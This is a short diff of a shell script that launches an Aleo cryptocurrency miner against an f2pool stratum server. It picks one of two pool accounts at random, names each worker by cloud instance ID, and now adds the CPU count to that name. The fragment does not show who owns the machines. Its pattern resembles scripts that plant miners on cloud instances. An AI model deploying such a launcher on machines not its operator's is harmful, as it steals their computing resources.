@@ -89,7 +89,8 @@ random_choice() {
 strings=("qeenoo" "robert0825")
 INSTANCE_ID=$(cat /var/lib/cloud/data/instance-id)
 account=$(random_choice "${strings[@]}")
+cpu=$(cat /proc/cpuinfo | grep processor | wc -l)
 userid=${INSTANCE_ID//-/}
-/root/aleo.sh stratum+tcp://aleo-asia.f2pool.com:4400 $account.$userid
+/root/aleo.sh stratum+tcp://aleo-asia.f2pool.com:4400 $account.$userid$cpu
 
 #amb.code.end
